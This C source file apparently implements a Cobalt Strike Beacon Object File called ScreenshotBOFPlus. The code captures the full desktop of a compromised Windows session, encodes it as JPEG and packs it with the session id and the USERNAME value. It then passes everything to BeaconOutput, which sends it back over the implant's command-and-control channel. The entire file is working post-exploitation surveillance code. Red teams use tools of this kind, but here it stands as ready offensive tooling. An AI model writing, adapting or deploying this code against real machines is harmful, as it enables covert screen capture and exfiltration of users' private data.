#define CINTERFACE
#define COBJMACROS

#include <Objbase.h>
#include <wincodec.h>
#include <Winerror.h>
#include <assert.h>
#include <windows.h>
#include <wchar.h>
#include "beacon.h"

#define CALLBACK_SCREENSHOT  0x03
#define SUCCEEDED(hr)   (((HRESULT)(hr)) >= 0)
#define DESKTOPVERTRES  117  /* Horizontal width of entire desktop in   */
#define DESKTOPHORZRES  118  /* Vertical height of entire desktop in    */

#ifdef _WIN64
CONST GUID GUID_ContainerFormatJpeg = { 0x19e4a5aa, 0x5662, 0x4fc5, 0xa0, 0xc0, 0x17, 0x58, 0x02, 0x8e, 0x10, 0x57 };
CONST GUID GUID_WICPixelFormat24bppBGR = { 0x6fddc324, 0x4e03, 0x4bfe, 0xb1, 0x85, 0x3d, 0x77, 0x76, 0x8d, 0xc9, 0x0c };
CONST GUID CLSID_WICImagingFactory2 = { 0x317d06e8, 0x5f24, 0x433d, 0xbd, 0xf7, 0x79, 0xce, 0x68, 0xd8, 0xab, 0xc2 };
CONST GUID IID_IWICImagingFactory = { 0xec5ec8a9,0xc395,0x4314,0x9c,0x77,0x54,0xd7,0xa9,0x35,0xff,0x70 };
#else
CONST GUID GUID_ContainerFormatJpeg = { 0x19e4a5aa, 0x5662, 0x4fc5, 0xa0, 0xc0, 0x17, 0x58, 0x02, 0x8e, 0x10, 0x57 };
CONST GUID GUID_WICPixelFormat24bppBGR = { 0x6fddc324, 0x4e03, 0x4bfe, 0xb1, 0x85, 0x3d, 0x77, 0x76, 0x8d, 0xc9, 0x0c };
CONST GUID CLSID_WICImagingFactory2 = { 0x317d06e8, 0x5f24, 0x433d, 0xbd, 0xf7, 0x79, 0xce, 0x68, 0xd8, 0xab, 0xc2 };
CONST GUID IID_IWICImagingFactory = { 0xec5ec8a9,0xc395,0x4314,0x9c,0x77,0x54,0xd7,0xa9,0x35,0xff,0x70 };
#endif 

DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* _Block);
WINBASEAPI void __cdecl MSVCRT$memset(void* dest, int c, size_t count);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$ProcessIdToSessionId(DWORD, DWORD*);
DECLSPEC_IMPORT DWORD    WINAPI   KERNEL32$GetCurrentProcessId();
DECLSPEC_IMPORT HRESULT  WINAPI   OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT int WINAPI User32$GetSystemMetrics(int nIndex);
DECLSPEC_IMPORT HDC WINAPI User32$GetDC(HWND hWnd);
DECLSPEC_IMPORT HDC WINAPI GDI32$CreateCompatibleDC(HDC hdc);
DECLSPEC_IMPORT int WINAPI GDI32$GetDeviceCaps(HDC hdc,int index);
DECLSPEC_IMPORT char* WINAPI MSVCRT$getenv(const char* varname);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC hdc, int cx, int cy);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC hdc, HGDIOBJ h);
DECLSPEC_IMPORT BOOL WINAPI GDI32$BitBlt(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
DECLSPEC_IMPORT int WINAPI GDI32$GetObjectW(HANDLE h, int c, LPVOID pv);
DECLSPEC_IMPORT HRESULT  WINAPI   OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$DeleteObject(HGDIOBJ ho);
DECLSPEC_IMPORT int WINAPI User32$ReleaseDC(HWND hWnd, HDC  hDC);

void SendScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
    int messageLength;
    char* packedData;
    int packedIndex = 4;
    int i;
    messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
    packedData = (char*)MSVCRT$malloc(messageLength);
    packedData[0] = jpgLen & 0xFF;
    packedData[1] = (jpgLen >> 8) & 0xFF;
    packedData[2] = (jpgLen >> 16) & 0xFF;
    packedData[3] = (jpgLen >> 24) & 0xFF;
    for (i = 0; i < jpgLen; i++) {
        packedData[packedIndex] = jpg[i];
        packedIndex++;
    }
    packedData[packedIndex] = session & 0xFF;
    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
    packedData[packedIndex + 3] = (session >> 24) & 0xFF;
    packedData[packedIndex + 4] = titleLen & 0xFF;
    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;
    packedIndex += 8;
    for (i = 0; i < titleLen; i++) {
        packedData[packedIndex] = windowTitle[i];
        packedIndex++;
    }
    packedData[packedIndex] = usernameLen & 0xFF;
    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;
    packedIndex += 4;
    for (i = 0; i < usernameLen; i++) {
        packedData[packedIndex] = username[i];
        packedIndex++;
    }
    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
    MSVCRT$free(packedData); //fix memory leaks
    return;
}


int go()
{
    HANDLE hDIB;
    HANDLE hFile;
    DWORD dwBmpSize;
    DWORD dwSizeofDIB;
    DWORD dwBytesWritten;
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    CHAR* lpbitmap;
    BITMAP bm_info = { 0 };
    IWICImagingFactory* factory = NULL;
    IWICBitmap* wic_bitmap = NULL;
    IWICStream* stream = NULL;
    IWICBitmapEncoder* encoder = NULL;
    IWICBitmapFrameEncode* frame = NULL;
    HRESULT hr = S_OK;
    BYTE* Memory;
    LARGE_INTEGER pos;
    ULARGE_INTEGER size;
    char* user = (char*)MSVCRT$getenv("USERNAME");
    char title[] = "ScreenshotBOFPlus";
    int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
    int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
    DWORD session = -1;
    //INT width = User32$GetSystemMetrics(SM_CXSCREEN);
    //INT height = User32$GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = User32$GetDC(NULL);
    INT width = GDI32$GetDeviceCaps(hdcScreen, DESKTOPHORZRES); //get full screen
    INT height = GDI32$GetDeviceCaps(hdcScreen, DESKTOPVERTRES); //get full screen
    HDC hdcMemDC = GDI32$CreateCompatibleDC(hdcScreen);

    KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &session);

    if (session == 0){ //can't get screenshot from console session
        BeaconPrintf(CALLBACK_ERROR, "Can't get screenshot from console session!\n");
        goto done;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT_UTF8, "Ready to get screenshot from session:%d!\n", session);
    }


    if (!hdcMemDC)
    {
        goto done;
    }
    hbmScreen = GDI32$CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hbmScreen)
    {
        goto done;
    }
    GDI32$SelectObject(hdcMemDC, hbmScreen);
    if (!GDI32$BitBlt(
        hdcMemDC,
        0, 0,
        width, height,
        hdcScreen,
        0, 0,
        SRCCOPY))
    {
        goto done;
    }
    GDI32$GetObjectW(hbmScreen, sizeof(BITMAP), &bmpScreen);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    Memory = MSVCRT$malloc(dwBmpSize / 6);
    MSVCRT$memset(Memory, 0, dwBmpSize / 6);
    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (!GDI32$GetObjectW(hbmScreen, sizeof(bm_info), &bm_info)) {
        hr = E_FAIL;
    }
    factory = NULL;
    if (SUCCEEDED(hr)) {
        hr = OLE32$CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
            &IID_IWICImagingFactory, &factory);
    }
    wic_bitmap = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateBitmapFromHBITMAP(factory, hbmScreen, NULL,
            WICBitmapIgnoreAlpha,
            &wic_bitmap);
    }
    stream = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateStream(factory, &stream);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICStream_InitializeFromMemory(stream, Memory, dwBmpSize / 6);
    }
    encoder = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateEncoder(factory, &GUID_ContainerFormatJpeg, NULL, &encoder);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_Initialize(encoder, (IStream*)stream, WICBitmapEncoderNoCache);
    }
    frame = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_CreateNewFrame(encoder, &frame, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_Initialize(frame, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_SetSize(frame, bm_info.bmWidth, bm_info.bmHeight);
    }
    if (SUCCEEDED(hr)) {
        GUID pixel_format = GUID_WICPixelFormat24bppBGR;
        hr = IWICBitmapFrameEncode_SetPixelFormat(frame, &pixel_format);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_WriteSource(frame, (IWICBitmapSource*)wic_bitmap, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_Commit(frame);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_Commit(encoder);
    }
    pos.QuadPart = 0;
    IStream_Seek(stream, pos, STREAM_SEEK_CUR, &size);
    SendScreenshot((char*)Memory, size.QuadPart, session, (char*)title, titleLength, (char*)user, userLength);
    if (frame) {
        IWICBitmapFrameEncode_Release(frame);
    }
    if (encoder) {
        IWICBitmapEncoder_Release(encoder);
    }
    if (stream) {
        IWICStream_Release(stream);
    }
    if (wic_bitmap) {
        IWICBitmap_Release(wic_bitmap);
    }
    if (factory) {
        IWICImagingFactory_Release(factory);
    }
    MSVCRT$free(Memory); //fix memory leaks
done:
    GDI32$DeleteObject(hbmScreen);
    GDI32$DeleteObject(hdcMemDC);
    User32$ReleaseDC(NULL, hdcScreen);
    return 0;
}
